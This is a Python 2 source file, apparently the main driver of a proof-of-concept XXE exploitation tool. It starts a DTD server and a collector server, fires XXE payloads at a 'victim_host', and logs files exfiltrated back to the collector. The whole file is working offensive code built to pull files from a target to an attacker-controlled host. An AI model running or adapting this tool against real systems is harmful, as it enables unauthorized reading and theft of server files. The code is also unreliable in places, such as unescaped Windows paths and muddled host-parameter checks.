'''
POC script to automate xxe detection and exploitation on a particular application being tested by me.
Idea is to evolve this scipt into a generic xxe detector based on template payloads and automated fuzzing.
mkocbayi@gmail.com
Note: If you set thread limit too high (>10) you may have miss data.
Some files that should be exfiltrated may not return because of their size.
'''
from __future__ import print_function
from socket import *
import os
import sys
script_path = os.path.dirname(os.path.realpath(__file__))
sys.path.append(script_path + '/libs')
import signal
from signal import *
from CollectorServer import CollectorServer
from DtdServer import DtdServer
from threading import Thread
from Queue import Queue
from Smasher import Smasher
import getopt
#used for retrieving ip address of iface
import netifaces as ni
import datetime
import threading
from copy import deepcopy
import logging
import pprint
#logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

settings = {
    'collector_message_queue' : Queue(), 
    'dtd_message_queue' : Queue(),
    'smasher_message_queue' : Queue(),
    'collector_port' : None,
    'dtd_host' : None,
    'dtd_port' : None,
    'collector_host' : None,
    'victim_host' : None,
    'sif' : None,
    'victim_tls' : False,
    'debug' : None, 
    'script_path':script_path, 
    'wordlists_path':script_path+'\wordlists',
    'exfiltrate_wordlists':script_path+'\wordlists\exfiltrate_wordlists',  
    'log_path': script_path+'\logs',
    'log_results_path' : None, 
    'collector_messages' : [], #list of received messages from threads
    'dtd_messages' : [], #list of received messages from threads
    'smasher_messages' : [], #list of received messages from threads
    'thread_limit' : 1, #number of threads for scanning
}

thread_jobs = []
lock = threading.Lock()

#Used for helping with printing with threads
print = lambda x: sys.stdout.write("%s\n" % x)
sys.stdout.flush()

def catchSignal(*args):
    sys.exit(0)

for sig in (SIGABRT, SIGILL, SIGINT, SIGSEGV, SIGTERM):
    signal(sig, catchSignal)

def set_new_log_path():
    current_datetime = datetime.datetime.now()
    filename = "\\%s%s%s_%s%s%s"  %(current_datetime.year,current_datetime.month, current_datetime.day, current_datetime.hour, current_datetime.minute, current_datetime.second )
    settings['log_results_path'] = settings['log_path'] + filename
    
def doCollectorServer():
    collector_server = CollectorServer(
            port=settings['collector_port'], 
            host=settings['collector_host'], 
            queue=settings['collector_message_queue'], 
            debug = settings['debug'], 
            )
    collector_server.run()
    
def doDtdServer():
    template_name = settings['script_path'] + '\templates\dtd\send.dtd'
    dtd_server = DtdServer(
            queue=settings['dtd_message_queue'], 
            collector_host=settings['collector_host'], 
            collector_port=settings['collector_port'], 
            port=settings['dtd_port'], 
            template_name=template_name, 
            debug = settings['debug'], 
            )
    dtd_server.run()

def writeCollectorLogFile(filename, data):
    if data:
        filename = settings['log_results_path'] + '\\' + filename
        if not os.path.exists(os.path.dirname(settings['log_results_path'])):
            os.makedirs(os.path.dirname(settings['log_results_path']))
        if not os.path.exists(os.path.dirname(filename)):
            os.makedirs(os.path.dirname(filename))
        with open(filename, 'a') as f:
            f.write(data)

def doReceiveCollectorMessages():
    while True:
        print("Waiting for Collector messages")
        with lock:
            message = settings['collector_message_queue'].get()
            collector_job = getMessageWithScanID(message['scan_id'],  settings['collector_messages'])
            #Do we already have a collector message with the same id?
            if not collector_job:
                scan_job = getMessageWithScanID(message['scan_id'],  settings['smasher_messages'])
                if not scan_job:
                    print("Exception")
                    print("="*60)
                    #pprint.pprint(globals())
                    pprint.pprint(settings['smasher_messages'])
                    pprint.pprint(message)
                    print("="*60)
                    raise Exception("Cannot process collctor message with no corresponding scan job")
                #Scan jobs should exist before collectors so grab the corresponding job for more details
                settings['collector_messages'].append(deepcopy(message))
                filename = message['scan_id']+".txt"
                if message['data'] is None: #Might have empty file returned
                    message['data'] = ''
                file_contents = "File: " + scan_job['exfiltrate_filename'] +"\n" + message['data']
                # log the host that connected to collector. Might be different to the intended victim
                file_contents = "From: " + message['victim_host'] +"\n" + file_contents
                writeCollectorLogFile(filename, file_contents)
            else: #May receive multiple connections for the same scan.
                print("Duplicate collector detected")
                collector_job['count'] = collector_job['count'] + 1
            if settings['debug']:
                print (message)

def getMessageWithScanID(scan_id, message_list):
    for message in message_list:
        if message['scan_id'] == scan_id:
            return message

def doReceiveDtdMessages():
    while True:
        print ("Waiting for DTD messages")
        message = settings['dtd_message_queue'].get()
        settings['dtd_messages'].append(deepcopy(message))
        if settings['debug']:
            print (message)

def doReceiveSmasherMessages():
    print ("\nWaiting for Smasher messages")
    while True:
        print ("\nReceived Smasher message")
        message = settings['smasher_message_queue'].get()
        settings['smasher_messages'].append(deepcopy(message))
        if settings['debug']:
            print (message)

def read_user_input():
    while True:
        user_input = raw_input('Type q to quit\n')
        if user_input == 'q':
            sys.exit(0)
    
def doStartThreads():
    thread = Thread(target=doCollectorServer)
    thread.daemon = True
    thread_jobs.append(thread)
    thread = Thread(target=doDtdServer)
    thread.daemon = True
    thread_jobs.append(thread)
    thread = Thread(target=doReceiveCollectorMessages)
    thread.daemon = True
    thread_jobs.append(thread)
    thread = Thread(target=doReceiveDtdMessages)
    thread.daemon = True
    thread_jobs.append(thread)
    thread = Thread(target=doReceiveSmasherMessages)
    thread.daemon = True
    thread_jobs.append(thread)
    thread = Thread(target=doStartSmasher)
    thread.daemon = True
    thread_jobs.append(thread)
    thread = Thread(target=read_user_input)
    thread.daemon = False #This thread will allow the main script to block while waiting for user input
    thread_jobs.append(thread)

    print ('*** Main thread waiting')
    for thread_job in thread_jobs:
        thread_job.start()
    print ('*** Done')
    
def doStartSmasher():
    template_name = settings['script_path'] + '\templates\smasher\post.http'
    smasher = Smasher(queue=settings['smasher_message_queue'], 
                                victim_host = settings['victim_host'], 
                                username = '',
                                password = '', 
                                dtd_server = settings['dtd_host'], 
                                dtd_port = settings['dtd_port'], 
                                port=settings['victim_port'], 
                                tls=settings['victim_tls'], 
                                template_name = template_name, 
                                dtd_filename='send.dtd', 
                                exfiltrate_wordlists = settings['exfiltrate_wordlists'], 
                                debug = settings['debug'], 
                                thread_limit = settings['thread_limit'], 
                            )
    smasher.run()

def usage():
    print (' -------------------------------------------------------------------------')
    print (' Mutti K September 11th, 2015')
    print (' -------------------------------------------------------------------------')
    print (' Example run')
    print (' kisskissie.py --dtd_host=10.10.10.10 --collector_port=80 --dtd_port=8888 --victim_host=host.victim.com --victim_port=443 --victim_tls=1 --threads=3')
    print (' Results saved to log files in log directory.')
    print (' ')
    sys.exit(' ')


def get_ip_address(ifname):
    return ni.ifaddresses(ifname) [2][0]['addr']    

def main(argv):
    set_new_log_path()
    
    try:
        opts, args = getopt.getopt(argv,"h:v",
                                 ["collector_port=", 
                                 "debug=", 
                                 "dtd_host=", 
                                 "dtd_port=", 
                                 "collector_host=", 
                                 "victim_host=", 
                                 "victim_port=", 
                                 "victim_tls=",  
                                 "timeout=", 
                                 "username=", 
                                 "output-format=", 
                                 "password=", 
                                 "sif=", 
                                 "thread_limit=", 
                                 ])
    except getopt.GetoptError,  e:
        print ("\nError: %s"%e)
        usage()
        sys.exit(2)
    
    for opt, arg in opts:
        if opt == '-h':
            print ('<script>.py')
            sys.exit()
        elif opt in ("--collector_port"):
            #collector server port number
            settings['collector_port'] = int(arg)
        elif opt in ("-v", "--debug"):
            settings['debug'] = 1
        elif opt in ("--dtd_host"):
            #dtd server host
            settings['dtd_host'] = arg
        elif opt in ("--dtd_port"):
            #dtd server port number
            settings['dtd_port'] = int(arg)
        elif opt in ("--collector_host"):
            #collector host address
            settings['collector_host'] = arg
        elif opt in ("--victim_host"):
            #accept FQDN or IP
            settings['victim_host'] = arg
        elif opt in ("--victim_port"):
            #victim listening port
            settings['victim_port'] = int(arg)
        elif opt in ("--victim_tls"):
            #Victim using tls?
            settings['victim_tls'] = True
        elif opt in ("--timeout"):
            settings['timeout'] = arg
        elif opt in ("--sif"):
            #accept interface name
            settings['collector_host'] = get_ip_address(arg)
            settings['sif'] = arg
        elif opt in ("--username"):
            #Username for authentication to victim
            settings['username'] = arg
        elif opt in ("--password"):
            #Password for authentication to victim
            settings['password'] = arg
        elif opt in ("--output-format"):
            settings['output_format'] = arg
        elif opt in ("--thread_limit"):
            settings['thread_limit'] = int(arg)
        else:
            usage()
    if (settings['victim_host'] is None): #make sure we have ip address to scan
        raise Exception("Must set victim_host parameters")
    #Check if collector and dtd host params have been set
    if (settings['collector_host'] == None):
        if (settings['dtd_host'] ==None):
            raise Exception("Must set collector_host or dtd_host parameters")
        else:
            settings['collector_host'] = settings['dtd_host']
    elif (settings['dtd_host'] == None):
            settings['dtd_host'] = settings['collector_host']
    else:
        raise Exception("Must set collector_host or dtd_host parameters")
    #All required params set
    doStartThreads()
    
if __name__=='__main__':
    try:
        main(sys.argv[1:])
    except Exception as e:
        print ('Cannot run program.\n%s' %e)
        if (settings['debug'] is not None):
            raise Exception("Verbose debug set.\n")
        sys.exit(0)
